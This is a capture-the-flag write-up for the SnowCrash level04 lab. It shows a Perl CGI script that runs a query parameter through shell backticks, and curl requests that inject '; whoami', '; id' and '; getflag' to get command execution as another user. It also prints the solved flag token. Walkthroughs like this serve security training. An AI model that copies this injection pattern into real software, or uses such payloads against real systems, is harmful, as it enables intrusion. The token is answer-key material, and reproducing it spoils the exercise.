# level04

1. Files found in `~/` :

    ```bash
    ./level04.pl
    ```

2. Script analysis

    The script is a small vulnerable CGI/Perl that executes the content of parameter `x` via shell backticks :

    ```perl
    use CGI qw{param};
    sub x {
    $y = $_[0];
    print `echo $y 2>&1`;
    }
    x(param("x"));
    ```

    The value provided by a visitor is passed to the shell and executed.

    - Confirm that a service is listening on port 4747 :

    ```bash
    level04@SnowCrash:~$ ss -tlnp | grep 4747
    LISTEN 0 128 :::4747 :::*     
    ```

    - Check under which user the command will execute (quick test) :

    ```bash
    level04@SnowCrash:~$ curl -s 'http://127.0.0.1:4747/?x=%3B+whoami'
    flag04
    level04@SnowCrash:~$ curl -s 'http://127.0.0.1:4747/?x=%3B+id'
    uid=3004(flag04) gid=2004(level04) groups=3004(flag04),1001(flag),2004(level04)
    ```

    The responses confirm that the script is active and will execute any command passed via the `x` parameter.

3. Exploitation

    The payload consists of separating the initial `echo` command from the malicious command with a `;` and calling `getflag` :

    ```bash
    curl 'http://127.0.0.1:4747/?x=%3B+getflag'
    ```

4. Token discovered

    The token is : `ne2searoevaevoem4ov4ar8ap`
